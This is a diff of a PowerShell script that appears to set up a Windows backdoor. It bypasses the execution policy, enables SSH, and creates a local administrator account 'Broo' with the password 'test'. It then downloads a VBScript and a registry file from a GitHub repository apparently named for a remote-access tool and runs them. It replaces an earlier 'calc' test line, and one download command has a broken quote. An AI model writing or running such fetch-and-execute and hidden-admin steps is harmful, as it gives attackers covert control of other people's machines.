@@ -1,4 +1,12 @@
 
+Get-ExecutionPolicy -List
+
+Set-ExecutionPolicy Bypass
+
+Get-ExecutionPolicy -List
+
+
+
 # Install the OpenSSH Client
 Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
 
@@ -30,8 +38,15 @@ net user Broo test
 net localgroup Administrateurs Broo /add 
 
 
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/khaledmraad/Ratatouille/main/hello.vbs" -OutFile "hello.vbs" 
+
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/khaledmraad/Ratatouille/main/wreg.reg -OutFile "wreg.reg"
+
+
+./wreg.reg; ./hello 
+
+
+
 
 Restart-Service sshd
 
-
-calc
